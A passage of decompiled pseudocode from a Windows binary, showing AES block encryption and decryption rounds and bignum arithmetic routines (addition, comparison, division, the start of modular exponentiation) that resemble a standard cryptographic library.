  v14 = (unsigned __int16)(*((_WORD *)v8 + 8) ^ (unsigned __int8)RijnDael_AES_inv_LONG_416470[(unsigned __int8)v22] ^ (unsigned __int16)(((unsigned __int8)RijnDael_AES_inv_LONG_416470[BYTE1(v17)] ^ (unsigned __int16)(((unsigned __int16)((unsigned __int8)RijnDael_AES_inv_LONG_416470[HIBYTE(v20)] << 8) ^ (unsigned __int8)RijnDael_AES_inv_LONG_416470[BYTE2(v25)]) << 8)) << 8)) >> 8;
  *(_BYTE *)a3 = v27;
  *(_WORD *)(a3 + 1) = __PAIR16__(BYTE2(v27), v14);
  *(_BYTE *)(a3 + 3) = HIBYTE(v27);
  *(_DWORD *)(a3 + 4) = v29;
  *(_BYTE *)(a3 + 9) = BYTE1(v12);
  *(_BYTE *)(a3 + 10) = BYTE2(v12);
  *(_BYTE *)(a3 + 13) = BYTE1(v13);
  *(_BYTE *)(a3 + 8) = v12;
  *(_BYTE *)(a3 + 12) = v13;
  *(_BYTE *)(a3 + 11) = HIBYTE(v12);
  *(_BYTE *)(a3 + 14) = BYTE2(v13);
  result = 0;
  *(_BYTE *)(a3 + 15) = HIBYTE(v13);
  return result;
}
// 416570: using guessed type int dword_416570[256];
// 416970: using guessed type int dword_416970[256];
// 416D70: using guessed type int dword_416D70[256];
// 417170: using guessed type int dword_417170[256];

//----- (004027B0) --------------------------------------------------------
int __cdecl sub_4027B0(int *a1, unsigned __int8 *a2, int a3)
{
  _DWORD *v5; // eax
  int v6; // ebx
  unsigned int v7; // ebx
  int v8; // edx
  _DWORD *v9; // eax
  unsigned int v10; // ebx
  int v11; // ecx
  int v12; // edx
  int v13; // edx
  int v14; // ebx
  int v15; // edx
  unsigned __int8 v16; // ah
  int result; // eax
  int i; // [esp+Ch] [ebp-18h]
  unsigned int v19; // [esp+Ch] [ebp-18h]
  unsigned int v20; // [esp+10h] [ebp-14h]
  unsigned int v21; // [esp+10h] [ebp-14h]
  unsigned int v22; // [esp+14h] [ebp-10h]
  unsigned int v23; // [esp+14h] [ebp-10h]
  int v24; // [esp+18h] [ebp-Ch]
  int v25; // [esp+18h] [ebp-Ch]
  unsigned int v26; // [esp+1Ch] [ebp-8h]
  unsigned int v27; // [esp+20h] [ebp-4h]
  unsigned int v28; // [esp+2Ch] [ebp+8h]
  int v29; // [esp+2Ch] [ebp+8h]
  unsigned int v30; // [esp+30h] [ebp+Ch]
  unsigned int v31; // [esp+30h] [ebp+Ch]

  v5 = (_DWORD *)a1[1];
  v6 = *a2 | ((a2[1] | (*((unsigned __int16 *)a2 + 1) << 8)) << 8);
  v30 = v5[1] ^ (a2[4] | ((a2[5] | (*((unsigned __int16 *)a2 + 3) << 8)) << 8));
  v7 = *v5 ^ v6;
  v28 = v5[2] ^ (a2[8] | ((a2[9] | (*((unsigned __int16 *)a2 + 5) << 8)) << 8));
  BYTE1(v24) = BYTE1(v7);
  v8 = v5[3] ^ (a2[12] | ((a2[13] | (*((unsigned __int16 *)a2 + 7) << 8)) << 8));
  v9 = v5 + 4;
  v27 = v8;
  for ( i = (*a1 >> 1) - 1; i > 0; --i )
  {
    v26 = *v9 ^ dword_415470[(unsigned __int8)v7] ^ dword_416070[HIBYTE(v27)] ^ dword_415870[BYTE1(v30)] ^ dword_415C70[BYTE2(v28)];
    v22 = v9[1] ^ dword_415470[(unsigned __int8)v30] ^ dword_416070[HIBYTE(v7)] ^ dword_415870[BYTE1(v28)] ^ dword_415C70[BYTE2(v27)];
    v20 = v9[2] ^ dword_415470[(unsigned __int8)v28] ^ dword_416070[HIBYTE(v30)] ^ dword_415C70[BYTE2(v7)] ^ dword_415870[BYTE1(v27)];
    v10 = v9[3] ^ dword_415470[(unsigned __int8)v27] ^ dword_416070[HIBYTE(v28)] ^ dword_415870[BYTE1(v7)] ^ dword_415C70[BYTE2(v30)];
    v24 = v9[4] ^ dword_415470[(unsigned __int8)v26] ^ dword_416070[HIBYTE(v10)] ^ dword_415870[BYTE1(v22)] ^ dword_415C70[BYTE2(v20)];
    v30 = v9[5] ^ dword_415470[(unsigned __int8)v22] ^ dword_416070[HIBYTE(v26)] ^ dword_415870[BYTE1(v20)] ^ dword_415C70[BYTE2(v10)];
    v28 = v9[6] ^ dword_415470[(unsigned __int8)v20] ^ dword_416070[HIBYTE(v22)] ^ dword_415C70[BYTE2(v26)] ^ dword_415870[BYTE1(v10)];
    v11 = (unsigned __int8)v10;
    v7 = v24;
    v12 = v9[7] ^ dword_415470[v11] ^ dword_416070[HIBYTE(v20)] ^ dword_415870[BYTE1(v26)] ^ dword_415C70[BYTE2(v22)];
    v9 += 8;
    v27 = v12;
  }
  v23 = *v9 ^ dword_415470[(unsigned __int8)v7] ^ dword_416070[HIBYTE(v27)] ^ dword_415870[BYTE1(v30)] ^ dword_415C70[BYTE2(v28)];
  v21 = v9[1] ^ dword_415470[(unsigned __int8)v30] ^ dword_416070[HIBYTE(v7)] ^ dword_415870[BYTE1(v28)] ^ dword_415C70[BYTE2(v27)];
  v13 = dword_415C70[BYTE2(v30)];
  v31 = v9[2] ^ dword_415470[(unsigned __int8)v28] ^ dword_416070[HIBYTE(v30)] ^ dword_415C70[BYTE2(v7)] ^ dword_415870[BYTE1(v27)];
  v19 = v9[3] ^ dword_415470[(unsigned __int8)v27] ^ dword_416070[HIBYTE(v28)] ^ dword_415870[BYTE1(v24)] ^ v13;
  v29 = v9[4] ^ (unsigned __int8)RijnDael_AES_LONG_415370[(unsigned __int8)v23] ^ (((unsigned __int8)RijnDael_AES_LONG_415370[BYTE1(v21)] ^ ((((unsigned __int8)RijnDael_AES_LONG_415370[HIBYTE(v19)] << 8) ^ (unsigned __int8)RijnDael_AES_LONG_415370[BYTE2(v31)]) << 8)) << 8);
  v25 = v9[5] ^ (unsigned __int8)RijnDael_AES_LONG_415370[(unsigned __int8)v21] ^ (((unsigned __int8)RijnDael_AES_LONG_415370[BYTE1(v31)] ^ ((((unsigned __int8)RijnDael_AES_LONG_415370[HIBYTE(v23)] << 8) ^ (unsigned __int8)RijnDael_AES_LONG_415370[BYTE2(v19)]) << 8)) << 8);
  v14 = v9[6] ^ (unsigned __int8)RijnDael_AES_LONG_415370[(unsigned __int8)v31] ^ (((unsigned __int8)RijnDael_AES_LONG_415370[BYTE1(v19)] ^ ((((unsigned __int8)RijnDael_AES_LONG_415370[HIBYTE(v21)] << 8) ^ (unsigned __int8)RijnDael_AES_LONG_415370[BYTE2(v23)]) << 8)) << 8);
  v15 = v9[7] ^ (unsigned __int8)RijnDael_AES_LONG_415370[(unsigned __int8)v19] ^ (((unsigned __int8)RijnDael_AES_LONG_415370[BYTE1(v23)] ^ ((((unsigned __int8)RijnDael_AES_LONG_415370[HIBYTE(v31)] << 8) ^ (unsigned __int8)RijnDael_AES_LONG_415370[BYTE2(v21)]) << 8)) << 8);
  v16 = (unsigned __int16)(*((_WORD *)v9 + 8) ^ (unsigned __int8)RijnDael_AES_LONG_415370[(unsigned __int8)v23] ^ (unsigned __int16)(((unsigned __int8)RijnDael_AES_LONG_415370[BYTE1(v21)] ^ (unsigned __int16)(((unsigned __int16)((unsigned __int8)RijnDael_AES_LONG_415370[HIBYTE(v19)] << 8) ^ (unsigned __int8)RijnDael_AES_LONG_415370[BYTE2(v31)]) << 8)) << 8)) >> 8;
  *(_BYTE *)a3 = v29;
  *(_WORD *)(a3 + 1) = __PAIR16__(BYTE2(v29), v16);
  *(_BYTE *)(a3 + 3) = HIBYTE(v29);
  *(_DWORD *)(a3 + 4) = v25;
  *(_BYTE *)(a3 + 9) = BYTE1(v14);
  *(_BYTE *)(a3 + 10) = BYTE2(v14);
  *(_BYTE *)(a3 + 13) = BYTE1(v15);
  *(_BYTE *)(a3 + 8) = v14;
  *(_BYTE *)(a3 + 12) = v15;
  *(_BYTE *)(a3 + 11) = HIBYTE(v14);
  *(_BYTE *)(a3 + 14) = BYTE2(v15);
  result = 0;
  *(_BYTE *)(a3 + 15) = HIBYTE(v15);
  return result;
}
// 415470: using guessed type int dword_415470[256];
// 415870: using guessed type int dword_415870[256];
// 415C70: using guessed type int dword_415C70[256];
// 416070: using guessed type int dword_416070[256];

//----- (00402D40) --------------------------------------------------------
int __cdecl sub_402D40(int a1, int a2, int a3)
{
  int v3; // ebx
  int v4; // edx
  int result; // eax
  size_t v6; // edi
  _DWORD *v7; // eax
  void *v8; // ecx
  const void *v9; // edx
  unsigned int *v10; // eax
  unsigned int *v11; // ebx
  unsigned int v12; // esi
  unsigned int *v13; // edi
  unsigned int v14; // ecx
  unsigned int v15; // edx
  BOOL v16; // ecx
  BOOL v17; // eax
  bool v18; // zf
  unsigned int v20; // ecx
  size_t v21; // edi
  unsigned int v22; // edx
  void *v23; // ebx
  const void *v24; // eax
  int v25; // edx
  unsigned int v26; // eax
  int v27; // [esp+14h] [ebp+8h]
  void *v28; // [esp+18h] [ebp+Ch]
  size_t v29; // [esp+18h] [ebp+Ch]
  int v30; // [esp+18h] [ebp+Ch]
  size_t v31; // [esp+1Ch] [ebp+10h]
  unsigned int v32; // [esp+1Ch] [ebp+10h]

  v3 = a2;
  v4 = a1;
  if ( a1 != a3 )
  {
    v4 = a2;
    v3 = a3;
  }
  if ( a1 != v4 )
  {
    result = sub_4031E0(a1, v4);
    if ( result )
      return result;
  }
  *(_DWORD *)a1 = 1;
  v6 = *(_DWORD *)(v3 + 4);
  v31 = v6;
  if ( v6 )
  {
    v7 = (_DWORD *)(*(_DWORD *)(v3 + 8) + 4 * v6 - 4);
    do
    {
      if ( *v7 )
        break;
      --v7;
      --v6;
    }
    while ( v6 );
    v31 = v6;
  }
  if ( v6 > 0x2710 )
    return -16;
  if ( *(_DWORD *)(a1 + 4) < v6 )
  {
    v8 = calloc(v6, 4u);
    v28 = v8;
    if ( v8 )
    {
      v9 = *(const void **)(a1 + 8);
      if ( v9 )
      {
        memcpy(v8, v9, 4 * *(_DWORD *)(a1 + 4));
        sub_408020(*(void **)(a1 + 8), 4 * *(_DWORD *)(a1 + 4));
        free(*(void **)(a1 + 8));
        v8 = v28;
      }
      *(_DWORD *)(a1 + 4) = v6;
      *(_DWORD *)(a1 + 8) = v8;
      goto LABEL_16;
    }
    return -16;
  }
LABEL_16:
  v10 = *(unsigned int **)(v3 + 8);
  v11 = *(unsigned int **)(a1 + 8);
  if ( v6 )
  {
    v29 = v6;
    v12 = 0;
    v13 = v10;
    do
    {
      v14 = *v13++;
      v15 = v12 + *v11;
      *v11 = v15 + v14;
      v16 = v15 + v14 < v14;
      ++v11;
      v17 = v15 < v12;
      v18 = v29-- == 1;
      v12 = v17 + v16;
    }
    while ( !v18 );
    v18 = v12 == 0;
    v30 = v17 + v16;
    if ( !v18 )
    {
      v20 = v17 + v16;
      v27 = 4 * v31;
      v21 = v31 + 1;
      do
      {
        v22 = *(_DWORD *)(a1 + 4);
        v32 = v20;
        if ( v21 - 1 < v22 )
        {
          v25 = v27;
        }
        else
        {
          if ( v21 > 0x2710 )
            return -16;
          if ( v22 < v21 )
          {
            v23 = calloc(v21, 4u);
            if ( !v23 )
              return -16;
            v24 = *(const void **)(a1 + 8);
            if ( v24 )
            {
              memcpy(v23, v24, 4 * *(_DWORD *)(a1 + 4));
              sub_408020(*(void **)(a1 + 8), 4 * *(_DWORD *)(a1 + 4));
              free(*(void **)(a1 + 8));
            }
            v20 = v30;
            *(_DWORD *)(a1 + 4) = v21;
            *(_DWORD *)(a1 + 8) = v23;
          }
          v25 = v27;
          v11 = (unsigned int *)(v27 + *(_DWORD *)(a1 + 8));
        }
        v26 = v20 + *v11;
        *v11 = v26;
        v20 = v26 < v20;
        v27 = v25 + 4;
        ++v21;
        v30 = v20;
        ++v11;
      }
      while ( v26 < v32 );
    }
  }
  return 0;
}

//----- (00402F10) --------------------------------------------------------
int __cdecl sub_402F10(_DWORD *a1, int *a2, int a3)
{
  int v3; // ecx
  int v5[3]; // [esp+0h] [ebp-Ch] BYREF

  v3 = a3 >> 31;
  v5[1] = 1;
  a3 = abs32(a3);
  v5[2] = (int)&a3;
  v5[0] = (v3 & 0xFFFFFFFE) + 1;
  return sub_402F50(a1, a2, v5);
}

//----- (00402F50) --------------------------------------------------------
int __cdecl sub_402F50(_DWORD *a1, int *a2, _DWORD *a3)
{
  int v3; // esi
  _DWORD *v4; // edi
  int result; // eax

  v3 = *a2;
  if ( *a2 * *a3 >= 0 )
  {
    v4 = a1;
    result = sub_402D40((int)a1, (int)a2, (int)a3);
    if ( result )
      return result;
    goto LABEL_8;
  }
  if ( (sub_403020((int)a2, (int)a3) & 0x80000000) == 0 )
  {
    v4 = a1;
    result = sub_4056C0((int)a1, (int)a2, (int)a3);
    if ( result )
      return result;
LABEL_8:
    *v4 = v3;
    return result;
  }
  result = sub_4056C0((int)a1, (int)a3, (int)a2);
  if ( !result )
    *a1 = -v3;
  return result;
}

//----- (00402FC0) --------------------------------------------------------
unsigned int __cdecl sub_402FC0(int a1)
{
  int v1; // ecx
  int v3; // ecx
  _DWORD *v4; // eax
  unsigned int v5; // edx
  unsigned int v6; // esi

  v1 = *(_DWORD *)(a1 + 4);
  if ( !v1 )
    return 0;
  v3 = v1 - 1;
  if ( v3 )
  {
    v4 = (_DWORD *)(*(_DWORD *)(a1 + 8) + 4 * v3);
    do
    {
      if ( *v4 )
        break;
      --v4;
      --v3;
    }
    while ( v3 );
  }
  v5 = 0;
  v6 = 0x80000000;
  do
  {
    if ( (*(_DWORD *)(*(_DWORD *)(a1 + 8) + 4 * v3) & v6) != 0 )
      break;
    ++v5;
    v6 >>= 1;
  }
  while ( v5 < 0x20 );
  return 32 * (v3 + 1) - v5;
}

//----- (00403020) --------------------------------------------------------
unsigned int __cdecl sub_403020(int a1, int a2)
{
  unsigned int result; // eax
  _DWORD *v3; // ecx
  unsigned int v4; // edx
  _DWORD *v5; // ecx
  int v6; // ecx
  int v7; // edi
  _DWORD *i; // edx

  result = *(_DWORD *)(a1 + 4);
  if ( result )
  {
    v3 = (_DWORD *)(*(_DWORD *)(a1 + 8) + 4 * result - 4);
    do
    {
      if ( *v3 )
        break;
      --v3;
      --result;
    }
    while ( result );
  }
  v4 = *(_DWORD *)(a2 + 4);
  if ( v4 )
  {
    v5 = (_DWORD *)(*(_DWORD *)(a2 + 8) + 4 * v4 - 4);
    do
    {
      if ( *v5 )
        break;
      --v5;
      --v4;
    }
    while ( v4 );
  }
  if ( result )
  {
    if ( result > v4 )
      return 1;
LABEL_13:
    if ( v4 > result )
      return -1;
    if ( !result )
      return 0;
    v6 = *(_DWORD *)(a1 + 8);
    v7 = *(_DWORD *)(a2 + 8) - v6;
    for ( i = (_DWORD *)(v6 - 4 + 4 * result); *i <= *(_DWORD *)((char *)i + v7); --i )
    {
      if ( *i < *(_DWORD *)((char *)i + v7) )
        return -1;
      if ( !--result )
        return 0;
    }
    return 1;
  }
  if ( v4 )
    goto LABEL_13;
  return result;
}

//----- (004030C0) --------------------------------------------------------
int __cdecl sub_4030C0(int *a1, int a2)
{
  int v2; // ecx
  int v4[3]; // [esp+0h] [ebp-Ch] BYREF

  v2 = a2 >> 31;
  v4[1] = 1;
  a2 = abs32(a2);
  v4[2] = (int)&a2;
  v4[0] = (v2 & 0xFFFFFFFE) + 1;
  return sub_403100(a1, v4);
}

//----- (00403100) --------------------------------------------------------
int __cdecl sub_403100(int *a1, int *a2)
{
  unsigned int v2; // ecx
  _DWORD *v3; // eax
  unsigned int v4; // edx
  _DWORD *v5; // eax
  bool v7; // cc
  int v8; // edi
  bool v9; // cc
  int v10; // eax
  int v11; // ebx
  _DWORD *i; // edx

  v2 = a1[1];
  if ( v2 )
  {
    v3 = (_DWORD *)(a1[2] + 4 * v2 - 4);
    do
    {
      if ( *v3 )
        break;
      --v3;
      --v2;
    }
    while ( v2 );
  }
  v4 = a2[1];
  if ( v4 )
  {
    v5 = (_DWORD *)(a2[2] + 4 * v4 - 4);
    do
    {
      if ( *v5 )
        break;
      --v5;
      --v4;
    }
    while ( v4 );
  }
  if ( v2 )
  {
    v7 = v4 <= v2;
    if ( v4 < v2 )
      return *a1;
  }
  else
  {
    if ( !v4 )
      return 0;
    v7 = 0;
  }
  if ( !v7 )
    return -*a2;
  v8 = *a1;
  if ( *a1 <= 0 )
  {
    v9 = *a2 <= 0;
  }
  else
  {
    v9 = *a2 <= 0;
    if ( *a2 < 0 )
      return 1;
  }
  if ( !v9 && v8 < 0 )
    return -1;
  if ( !v2 )
    return 0;
  v10 = a1[2];
  v11 = a2[2] - v10;
  for ( i = (_DWORD *)(v10 - 4 + 4 * v2); *i <= *(_DWORD *)((char *)i + v11); --i )
  {
    if ( *i < *(_DWORD *)((char *)i + v11) )
      return -v8;
    if ( !--v2 )
      return 0;
  }
  return v8;
}

//----- (004031E0) --------------------------------------------------------
int __cdecl sub_4031E0(int a1, int a2)
{
  int v3; // eax
  int v5; // esi
  _DWORD *v6; // eax
  size_t v7; // esi
  unsigned int v8; // eax
  void *v9; // ecx
  const void *v10; // edx
  void *v11; // [esp+10h] [ebp+8h]

  if ( a1 == a2 )
    return 0;
  v3 = *(_DWORD *)(a2 + 8);
  if ( !v3 )
  {
    sub_404050(a1);
    return 0;
  }
  v5 = *(_DWORD *)(a2 + 4) - 1;
  if ( *(_DWORD *)(a2 + 4) != 1 )
  {
    v6 = (_DWORD *)(v3 + 4 * v5);
    do
    {
      if ( *v6 )
        break;
      --v6;
      --v5;
    }
    while ( v5 );
  }
  v7 = v5 + 1;
  *(_DWORD *)a1 = *(_DWORD *)a2;
  v8 = *(_DWORD *)(a1 + 4);
  if ( v8 >= v7 )
  {
    memset((void *)(*(_DWORD *)(a1 + 8) + 4 * v7), 0, 4 * (v8 - v7));
    v9 = *(void **)(a1 + 8);
  }
  else
  {
    if ( v7 > 0x2710 )
      return -16;
    v9 = calloc(v7, 4u);
    v11 = v9;
    if ( !v9 )
      return -16;
    v10 = *(const void **)(a1 + 8);
    if ( v10 )
    {
      memcpy(v9, v10, 4 * *(_DWORD *)(a1 + 4));
      sub_408020(*(void **)(a1 + 8), 4 * *(_DWORD *)(a1 + 4));
      free(*(void **)(a1 + 8));
      v9 = v11;
    }
    *(_DWORD *)(a1 + 4) = v7;
    *(_DWORD *)(a1 + 8) = v9;
  }
  memcpy(v9, *(const void **)(a2 + 8), 4 * v7);
  return 0;
}

//----- (004032C0) --------------------------------------------------------
int __cdecl sub_4032C0(_DWORD *a1, int *a2, int *a3, int *a4)
{
  int *v5; // edi
  int v6; // esi
  int v7; // eax
  unsigned int v8; // eax
  unsigned int v9; // ebx
  void *v10; // ebx
  void *v11; // ebx
  void *v12; // ebx
  void *v13; // ebx
  int v14; // edi
  unsigned int v15; // ebx
  unsigned int v16; // ecx
  _DWORD *v17; // edx
  int *v18; // ebx
  unsigned int v19; // esi
  unsigned int v20; // edx
  unsigned int v21; // eax
  int v22; // edx
  int v23; // eax
  _DWORD *v24; // ecx
  int v25; // eax
  unsigned int v26; // ecx
  int v27; // eax
  unsigned __int64 v28; // [esp-18h] [ebp-88h]
  int v29[3]; // [esp+4h] [ebp-6Ch] BYREF
  int v30; // [esp+10h] [ebp-60h] BYREF
  int v31; // [esp+14h] [ebp-5Ch]
  void *v32; // [esp+18h] [ebp-58h]
  int v33; // [esp+1Ch] [ebp-54h] BYREF
  int v34; // [esp+20h] [ebp-50h]
  int *v35; // [esp+24h] [ebp-4Ch]
  int v36; // [esp+28h] [ebp-48h] BYREF
  int v37; // [esp+2Ch] [ebp-44h]
  void *v38; // [esp+30h] [ebp-40h]
  int v39; // [esp+34h] [ebp-3Ch] BYREF
  int v40; // [esp+38h] [ebp-38h]
  void *v41; // [esp+3Ch] [ebp-34h]
  int v42; // [esp+40h] [ebp-30h] BYREF
  int v43; // [esp+44h] [ebp-2Ch]
  void *Block; // [esp+48h] [ebp-28h]
  int v45[2]; // [esp+4Ch] [ebp-24h] BYREF
  unsigned int *v46; // [esp+54h] [ebp-1Ch] BYREF
  unsigned int v47; // [esp+58h] [ebp-18h] BYREF
  int *v48; // [esp+5Ch] [ebp-14h]
  _DWORD *v49; // [esp+60h] [ebp-10h]
  unsigned int v50; // [esp+64h] [ebp-Ch]
  unsigned int v51; // [esp+68h] [ebp-8h]
  unsigned int v52; // [esp+6Ch] [ebp-4h]

  v47 = 0;
  v46 = &v47;
  v45[0] = 1;
  v45[1] = 1;
  if ( !sub_403100(a4, v45) )
    return -12;
  v5 = 0;
  v42 = 1;
  v43 = 0;
  Block = 0;
  v39 = 1;
  v40 = 0;
  v41 = 0;
  v30 = 1;
  v31 = 0;
  v32 = 0;
  v36 = 1;
  v37 = 0;
  v38 = 0;
  v33 = 1;
  v34 = 0;
  v35 = 0;
  if ( (sub_403020((int)a3, (int)a4) & 0x80000000) == 0 )
  {
    v6 = sub_4031E0((int)&v42, (int)a3);
    if ( v6 )
      goto LABEL_19;
    v6 = sub_4031E0((int)&v39, (int)a4);
    if ( v6 )
      goto LABEL_19;
    v7 = a3[1];
    v39 = 1;
    v42 = 1;
    v6 = sub_4046F0((int)&v30, v7 + 2);
    if ( v6 )
      goto LABEL_19;
    v6 = sub_404E70((int)&v30, 0);
    if ( v6 )
      goto LABEL_19;
    v6 = sub_4046F0((int)&v36, 2u);
    if ( v6 )
      goto LABEL_19;
    v6 = sub_4046F0((int)&v33, 3u);
    if ( v6 )
      goto LABEL_18;
    v8 = sub_402FC0((int)&v39) & 0x1F;
    if ( v8 >= 0x1F )
    {
      v47 = 0;
    }
    else
    {
      v9 = 31 - v8;
      v47 = 31 - v8;
      v6 = sub_405470((int)&v42, 31 - v8);
      if ( v6 )
        goto LABEL_18;
      v6 = sub_405470((int)&v39, v9);
      if ( v6 )
        goto LABEL_18;
    }
    v52 = v43 - 1;
    v50 = v40 - 1;
    v14 = v43 - v40;
    v15 = 32 * (v43 - v40);
    v6 = sub_405470((int)&v39, v15);
    if ( v6 )
      goto LABEL_18;
    while ( sub_403100(&v42, &v39) >= 0 )
    {
      ++*((_DWORD *)v32 + v14);
      v6 = sub_4057D0(&v42, &v42, &v39);
      if ( v6 )
        goto LABEL_18;
    }
    v6 = sub_4055B0((int)&v39, v15);
    if ( v6 )
    {
LABEL_18:
      v5 = v35;
LABEL_19:
      v10 = Block;
      if ( Block )
      {
        sub_408020(Block, 4 * v43);
        free(v10);
      }
      v11 = v41;
      if ( v41 )
      {
        sub_408020(v41, 4 * v40);
        free(v11);
      }
      v12 = v32;
      if ( v32 )
      {
        sub_408020(v32, 4 * v31);
        free(v12);
      }
      v13 = v38;
      if ( v38 )
      {
        sub_408020(v38, 4 * v37);
        free(v13);
      }
      if ( v5 )
      {
        sub_408020(v5, 4 * v34);
        free(v5);
      }
      return v6;
    }
    v16 = v52;
    if ( v52 <= v50 )
    {
      v5 = v35;
LABEL_67:
      if ( a1 )
      {
        v6 = sub_4031E0((int)a1, (int)&v30);
        if ( v6 )
          goto LABEL_19;
        *a1 = *a4 * *a3;
      }
      if ( a2 )
      {
        v6 = sub_4055B0((int)&v42, v47);
        if ( !v6 )
        {
          v42 = *a3;
          v6 = sub_4031E0((int)a2, (int)&v42);
          if ( !v6 && !sub_4030C0(a2, 0) )
            *a2 = 1;
        }
      }
      goto LABEL_19;
    }
    v17 = (char *)v41 + 4 * v50;
    v49 = v17;
    v51 = v15 - 32;
    v18 = (int *)((char *)v32 + 4 * v14 - 4);
    v5 = v35;
LABEL_38:
    v19 = *((_DWORD *)Block + v16);
    v20 = *v17;
    v48 = (int *)((char *)Block + 4 * v16);
    if ( v19 < v20 && v20 && v19 < v20 )
    {
      HIDWORD(v28) = v19;
      LODWORD(v28) = *((_DWORD *)Block + v16 - 1);
      v21 = sub_4012C0(v28, v20);
      if ( !v22 )
        goto LABEL_44;
      v46 = 0;
    }
    v21 = -1;
LABEL_44:
    *v18 = v21 + 1;
    while ( 1 )
    {
      --*v18;
      v23 = sub_404E70((int)&v36, 0);
      v6 = v23;
      if ( v23 )
        goto LABEL_19;
      if ( v50 )
        v23 = *(v49 - 1);
      v24 = v38;
      v29[0] = 1;
      v29[1] = 1;
      *(_DWORD *)v38 = v23;
      v24[1] = *v49;
      v29[2] = (int)&v46;
      v46 = (unsigned int *)*v18;
      v6 = sub_405190(&v36, &v36, v29);
      if ( v6 )
        goto LABEL_19;
      v25 = sub_404E70((int)&v33, 0);
      v6 = v25;
      if ( v25 )
        goto LABEL_18;
      v26 = v52;
      if ( v52 >= 2 )
        v25 = *((_DWORD *)Block + v52 - 2);
      v5 = v35;
      *v35 = v25;
      if ( v26 )
        v27 = *(v48 - 1);
      else
        v27 = 0;
      v5[1] = v27;
      v5[2] = *v48;
      if ( sub_403100(&v36, &v33) <= 0 )
      {
        v6 = sub_405150(&v36, &v39, *v18);
        if ( v6 )
          goto LABEL_19;
        v6 = sub_405470((int)&v36, v51);
        if ( v6 )
          goto LABEL_19;
        v6 = sub_4057D0(&v42, &v42, &v36);
        if ( v6 )
          goto LABEL_19;
        if ( sub_4030C0(&v42, 0) < 0 )
        {
          v6 = sub_4031E0((int)&v36, (int)&v39);
          if ( v6 )
            goto LABEL_19;
          v6 = sub_405470((int)&v36, v51);
          if ( v6 )
            goto LABEL_19;
          v6 = sub_402F50(&v42, &v42, &v36);
          if ( v6 )
            goto LABEL_19;
          --*v18;
        }
        --v18;
        v51 -= 32;
        v16 = v52 - 1;
        v17 = v49;
        v52 = v16;
        if ( v16 > v50 )
          goto LABEL_38;
        goto LABEL_67;
      }
    }
  }
  if ( !a1 || (v6 = sub_404E70((int)a1, 0)) == 0 )
  {
    if ( !a2 )
      return 0;
    v6 = sub_4031E0((int)a2, (int)a3);
    if ( !v6 )
      return 0;
  }
  return v6;
}
// 403622: variable 'v22' is possibly undefined

//----- (00403860) --------------------------------------------------------
int __cdecl sub_403860(_DWORD *a1, int *a2, int a3, int a4, int a5)
{
  int *v5; // edi
  size_t v6; // ecx
  unsigned int v7; // edx
  size_t v8; // ebx
  int v9; // ebx
  unsigned int v10; // eax
  int v11; // esi
  void *v12; // eax
  void *v13; // eax
  int v14; // eax
  unsigned int v15; // edx
  size_t v16; // eax
  size_t v17; // eax
  int *v18; // ecx
  size_t v19; // ecx
  int v20; // eax
  int v21; // edi
  unsigned int v22; // ebx
  size_t v23; // edx
  void **v24; // edi
  void *v25; // ebx
  void *v26; // edi
  void *v27; // edi
  void *v28; // edi
  void *v29; // ebx
  int v31[384]; // [esp+8h] [ebp-64Ch] BYREF
  int v32; // [esp+608h] [ebp-4Ch]
  int v33; // [esp+60Ch] [ebp-48h] BYREF
  int v34; // [esp+610h] [ebp-44h]
  void *v35; // [esp+614h] [ebp-40h]
  int v36; // [esp+618h] [ebp-3Ch] BYREF
  int v37; // [esp+61Ch] [ebp-38h]
  size_t *v38; // [esp+620h] [ebp-34h]
  __int64 v39; // [esp+624h] [ebp-30h] BYREF
  void *v40; // [esp+62Ch] [ebp-28h]
  int v41; // [esp+630h] [ebp-24h] BYREF
  int v42; // [esp+634h] [ebp-20h]
  void *v43; // [esp+638h] [ebp-1Ch]
  unsigned int i; // [esp+63Ch] [ebp-18h]
  unsigned int j; // [esp+640h] [ebp-14h]
  int v46; // [esp+644h] [ebp-10h]
  unsigned int v47; // [esp+648h] [ebp-Ch]
  size_t Count; // [esp+64Ch] [ebp-8h]
  size_t v49; // [esp+650h] [ebp-4h] BYREF

  v49 = 0;
  v5 = (int *)a4;
  v38 = &v49;
  v36 = 1;
  v37 = 1;
  if ( sub_403100((int *)a4, &v36) <= 0 )
    return -4;
  Count = **(_DWORD **)(a4 + 8);
  if ( (Count & 1) == 0 )
    return -4;
  v38 = &v49;
  v49 = 0;
  v36 = 1;
  v37 = 1;
  if ( sub_403100((int *)a3, &v36) < 0 )
    return -4;
  v6 = Count;
  v7 = 32;
  v8 = Count + ((2 * (_BYTE)Count + 4) & 8);
  do
  {
    v7 >>= 1;
    v8 *= 2 - v6 * v8;
    v6 = Count;
  }
  while ( v7 >= 8 );
  v39 = 1i64;
  v9 = -v8;
  v40 = 0;
  v41 = 1;
  v42 = 0;
  v43 = 0;
  v33 = 1;
  v34 = 0;
  v35 = 0;
  memset(v31, 0, sizeof(v31));
  v10 = sub_402FC0(a3);
  if ( v10 <= 0x29F )
  {
    if ( v10 <= 0xEF )
    {
      if ( v10 <= 0x4F )
        v47 = v10 > 0x17 ? 3 : 1;
      else
        v47 = 4;
    }
    else
    {
      v47 = 5;
    }
  }
  else
  {
    v47 = 6;
  }
  Count = *(_DWORD *)(a4 + 4) + 1;
  v11 = sub_4046F0((int)a1, Count);
  if ( !v11 )
  {
    v11 = sub_4046F0((int)&v31[3], Count);
    if ( !v11 )
    {
      v11 = sub_4046F0((int)&v41, 2 * Count);
      if ( !v11 )
      {
        v32 = *a2;
        if ( v32 == -1 )
        {
          v11 = sub_4031E0((int)&v33, (int)a2);
          if ( v11 )
            goto LABEL_73;
          v33 = 1;
          a2 = &v33;
        }
        if ( a5 && *(_DWORD *)(a5 + 8) )
        {
          v12 = *(void **)(a5 + 8);
          v39 = *(_QWORD *)a5;
          v40 = v12;
        }
        else
        {
          v11 = sub_404E70((int)&v39, 1);
          if ( v11 )
            goto LABEL_73;
          v11 = sub_405470((int)&v39, *(_DWORD *)(a4 + 4) << 6);
          if ( v11 )
            goto LABEL_73;
          v11 = sub_404FB0((int *)&v39, (int *)&v39, (int *)a4);
          if ( v11 )
            goto LABEL_73;
          if ( a5 )
          {
            v13 = v40;
            *(_QWORD *)a5 = v39;
            *(_DWORD *)(a5 + 8) = v13;
          }
        }
        v14 = sub_403100(a2, (int *)a4) < 0 ? sub_4031E0((int)&v31[3], (int)a2) : sub_404FB0(&v31[3], a2, (int *)a4);
        v11 = v14;
        if ( !v14 )
        {
